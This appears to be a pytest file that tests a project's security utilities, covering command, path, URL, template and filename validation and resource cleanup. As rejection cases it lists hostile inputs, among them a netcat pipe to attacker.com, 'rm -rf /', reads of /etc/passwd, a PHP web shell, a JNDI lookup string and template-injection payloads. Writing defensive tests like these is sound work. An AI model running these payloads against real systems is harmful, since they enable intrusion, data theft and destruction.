"""
Security tests for critical vulnerabilities and fixes.
"""

import subprocess
import tempfile
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest

from src.core.resource_manager import ResourceManager, managed_browser
from src.core.safe_formatter import MR_FORMATTER, SafeTemplateFormatter
from src.core.security_utils import (
    safe_subprocess_run,
    sanitize_template_string,
    secure_filename,
    validate_command_args,
    validate_path,
    validate_url,
)


class TestSecurityUtils:
    """Test security utility functions."""

    def test_validate_command_args_prevents_injection(self):
        """Test command validation prevents injection attacks."""
        # Valid arguments should pass
        valid_args = ["python", "script.py", "--option", "value"]
        assert validate_command_args(valid_args) == valid_args

        # Dangerous patterns should be rejected
        dangerous_args = [
            ["python; rm -rf /"],
            ["python && cat /etc/passwd"],
            ["python | nc attacker.com 4444"],
            ["python `whoami`"],
            ["python $(cat /etc/passwd)"],
            ["../etc/passwd"],
        ]

        for args in dangerous_args:
            with pytest.raises(ValueError, match="dangerous pattern"):
                validate_command_args(args)

    def test_validate_path_prevents_traversal(self):
        """Test path validation prevents directory traversal."""
        base_path = Path("/safe/base")

        # Valid paths should work
        valid_path = Path("/safe/base/subdir/file.txt")
        assert validate_path(valid_path, base_path) == valid_path.resolve()

        # Directory traversal should be blocked
        dangerous_paths = [
            Path("/safe/base/../../../etc/passwd"),
            Path("/safe/base/subdir/../../etc/passwd"),
        ]

        for path in dangerous_paths:
            with pytest.raises(ValueError, match="directory traversal"):
                validate_path(path, base_path)

    def test_validate_url_blocks_malicious_urls(self):
        """Test URL validation blocks dangerous URLs."""
        # Valid URLs should pass
        valid_urls = [
            "https://example.com",
            "http://api.github.com",
        ]

        for url in valid_urls:
            assert validate_url(url) == url

        # Dangerous URLs should be blocked
        dangerous_urls = [
            "ftp://example.com",
            "javascript:alert('xss')",
            "data:text/html,<script>alert('xss')</script>",
            "file:///etc/passwd",
            "https://localhost:8080",
            "https://127.0.0.1",
        ]

        for url in dangerous_urls:
            with pytest.raises(ValueError, match="Invalid URL"):
                validate_url(url)

    def test_sanitize_template_string(self):
        """Test template sanitization prevents injection."""
        # Valid templates should pass
        valid_template = "Hello {name}, your feature {feature_name} is ready"
        assert sanitize_template_string(valid_template) == valid_template

        # Dangerous templates should be blocked
        dangerous_templates = [
            "{{config.__class__.__init__.__globals__}}",
            "<?php system($_GET['cmd']); ?>",
            "<%= system('ls') %>",
            "${jndi:ldap://attacker.com/a}",
        ]

        for template in dangerous_templates:
            with pytest.raises(ValueError, match="dangerous pattern"):
                sanitize_template_string(template)

    def test_safe_subprocess_run(self):
        """Test safe subprocess run prevents command injection."""
        with patch('subprocess.run') as mock_run:
            mock_run.return_value = MagicMock(returncode=0, stdout="success")

            # Safe command should work
            safe_subprocess_run(["echo", "hello"], timeout=30)
            mock_run.assert_called_once()
            assert mock_run.call_args[1]['shell'] is False
            assert mock_run.call_args[1]['timeout'] == 30

            # Dangerous command should be blocked
            with pytest.raises(ValueError):
                safe_subprocess_run(["echo; rm -rf /"], timeout=30)

    def test_secure_filename(self):
        """Test filename sanitization."""
        # Valid filenames should work
        assert secure_filename("document.pdf") == "document.pdf"
        assert secure_filename("my-file.txt") == "my-file.txt"

        # Dangerous filenames should be sanitized
        assert secure_filename("../../../etc/passwd") == ".._.._.._etc_passwd"
        assert secure_filename("file<script>.txt") == "file_script_.txt"
        assert secure_filename("file\x00name.txt") == "filename.txt"

        # Empty filename should become 'unnamed'
        assert secure_filename("") == "unnamed"
        # '..' is kept but is safely just the filename part
        assert secure_filename("..") == ".."


class TestSafeTemplateFormatter:
    """Test safe template formatter prevents injection."""

    def test_mr_formatter_allows_only_valid_placeholders(self):
        """Test MR formatter only allows whitelisted placeholders."""
        # Valid template should work
        template = "feat: {feature_name}\n\n{description}\n\nChanges:\n{changes}"
        context = {
            "feature_name": "Add login feature",
            "description": "This adds user authentication",
            "changes": "- Added login endpoint\n- Added JWT tokens",
        }

        result = MR_FORMATTER.format_markdown(template, context)
        assert "Add login feature" in result
        assert "This adds user authentication" in result

        # Template with invalid placeholder should fail
        invalid_template = "feat: {feature_name}\n\n{system_info}"
        with pytest.raises(ValueError, match="not allowed"):
            MR_FORMATTER.format_markdown(invalid_template, context)

        # Context with dangerous values should be sanitized
        dangerous_context = {
            "feature_name": "Test {__import__('os').system('ls')}",
            "description": "Normal description",
            "changes": "- Some change",
        }

        result = MR_FORMATTER.format_markdown(template, dangerous_context)
        # The dangerous format specifier should be removed
        assert "__import__" not in result


class TestDependencyScannerSecurity:
    """Test dependency scanner security fixes."""

    def test_subprocess_calls_are_secure(self):
        """Test all subprocess calls use safe_subprocess_run."""
        # Check that safe_subprocess_run is imported
        import src.quality.dependency_scanner as ds
        from src.quality.dependency_scanner import DependencyScanner
        assert hasattr(ds, 'safe_subprocess_run')

        # Verify no direct subprocess.run calls remain
        with open(ds.__file__) as f:
            content = f.read()

        # Should not have direct subprocess.run calls
        import re
        direct_calls = re.findall(r'subprocess\.run\(', content)
        assert len(direct_calls) == 0, f"Found direct subprocess.run calls: {direct_calls}"

    def test_command_args_validation(self):
        """Test command arguments are validated before execution."""
        with patch('src.quality.dependency_scanner.safe_subprocess_run') as mock_safe:
            mock_safe.return_value = MagicMock(returncode=0, stdout="[]")

            from src.quality.dependency_scanner import DependencyScanner
            scanner = DependencyScanner()

            # Normal scan should work
            with tempfile.TemporaryDirectory() as tmpdir:
                scanner._scan_pip(Path(tmpdir))
                mock_safe.assert_called()

            # The safe_subprocess_run should have been called with validated args
            call_args = mock_safe.call_args
            assert 'timeout' in call_args[1]


class TestGitLabEnhancedSecurity:
    """Test GitLab enhanced security fixes."""

    def test_template_formatting_is_safe(self):
        """Test template formatting uses safe formatter."""
        # Check that MR_FORMATTER is imported
        import src.discovery.gitlab_enhanced as ge
        from src.discovery.gitlab_enhanced import GitLabEnhanced
        assert hasattr(ge, 'MR_FORMATTER')

        # Verify templates are formatted safely
        with patch.object(ge.MR_FORMATTER, 'format_markdown') as mock_format:
            mock_format.return_value = "Safe formatted string"

            gl = GitLabEnhanced()

            # Mock the API call
            with patch.object(gl, '_request') as mock_request:
                mock_request.return_value = {
                    "id": 123,
                    "iid": 45,
                    "title": "Test MR",
                    "description": "Test description",
                }

                # Create MR with potentially dangerous context
                dangerous_context = {
                    "feature_name": "Test {__import__('os').system('ls')}",
                    "description": "Normal description",
                    "changes": "- Some changes",
                }

                import asyncio
                asyncio.run(gl.create_automated_mr(
                    project_id="test/project",
                    source_branch="feature/test",
                    target_branch="main",
                    template_type="feature",
                    context=dangerous_context,
                ))

                # Verify safe formatter was used
                mock_format.assert_called()
                # The dangerous format string should not reach the API
                call_args = mock_request.call_args
                assert "__import__" not in str(call_args)


class TestResourceManager:
    """Test resource manager prevents leaks."""

    def test_resource_tracking(self):
        """Test resources are properly tracked."""
        manager = ResourceManager()

        # Create mock resource
        mock_resource = MagicMock()
        mock_resource.close = MagicMock()

        # Register resource
        manager.register(mock_resource, "test")
        assert len(manager._active_resources["test"]) == 1

        # Unregister resource
        manager.unregister(mock_resource, "test")
        assert len(manager._active_resources["test"]) == 0

    def test_cleanup_all_resources(self):
        """Test all resources are cleaned up on shutdown."""
        manager = ResourceManager()

        # Create mock resources
        mock_browser = MagicMock()
        mock_process = MagicMock()

        # Keep strong references (WeakSet needs this for testing)
        resources = [mock_browser, mock_process]

        # Register resources
        manager.register(mock_browser, "browsers")
        manager.register(mock_process, "processes")

        # Verify registration worked
        assert len(list(manager._active_resources["browsers"])) == 1
        assert len(list(manager._active_resources["processes"])) == 1

        # Cleanup
        manager._shutdown = False  # Reset shutdown flag for testing
        manager.cleanup_all()

        # Verify cleanup was called
        mock_browser.close.assert_called_once()
        mock_process.terminate.assert_called_once()

        # Keep reference to avoid garbage collection during test
        del resources


if __name__ == "__main__":
    # Run security tests
    pytest.main([__file__, "-v"])
